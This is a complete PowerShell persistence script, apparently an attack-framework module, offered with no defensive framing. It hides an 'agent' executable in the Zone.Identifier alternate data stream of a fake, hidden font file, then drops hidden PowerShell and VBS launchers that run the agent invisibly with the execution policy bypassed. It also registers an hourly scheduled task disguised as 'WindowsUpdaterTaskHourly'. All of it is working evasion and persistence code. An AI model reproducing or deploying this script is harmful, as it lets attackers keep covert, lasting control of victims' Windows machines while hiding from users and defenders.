$ProgressPreference = 'Continue'
$ErrorActionPreference = 'Continue'
$WarningPreference = 'Continue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'

param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "ERROR: AgentPath environment variable not set."
    exit 1
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    $fakeFontContent = "TTF fake font file - do not delete"
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
    Write-Output "[+] Created fake font file: $fontFile"
} else {
    Write-Output "[+] Using existing font file: $fontFile"
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -ErrorAction Stop
$hiddenPath = "$fontFile`:$streamName"
Write-Output "[+] Agent written to ADS ($($agentBytes.Length) bytes)"

# --- 3. Create launcher script (run.ps1) ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }

`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher: $launcherPath"

# --- 4. Create VBS launcher (completely invisible) ---
$vbsPath = "$fontDir\run.vbs"
$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
attrib +h $vbsPath
Write-Output "[+] Created VBS launcher: $vbsPath"

# --- 5. Create scheduled task: runs every 1 hour ---
$taskName = "WindowsUpdaterTaskHourly"
Write-Output "[*] Creating scheduled task '$taskName' to run every 1 hour..."

# Delete existing task if present
schtasks /delete /tn $taskName /f 2>$null

# Create hourly task using schtasks (most reliable, no COM needed)
schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc hourly /mo 1 /ru $env:USERNAME /f /it

if ($LASTEXITCODE -eq 0) {
    Write-Output "[+] Scheduled task '$taskName' created successfully (runs every 1 hour)."
    # Run immediately once
    schtasks /run /tn $taskName 2>$null
    Write-Output "[+] Task triggered immediately."
} else {
    Write-Output "ERROR: Failed to create scheduled task. Exit code: $LASTEXITCODE"
    exit 1
}

Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Agent hidden in: $hiddenPath"
Write-Output "Task runs every 1 hour (next run: check 'schtasks /query /tn $taskName')"
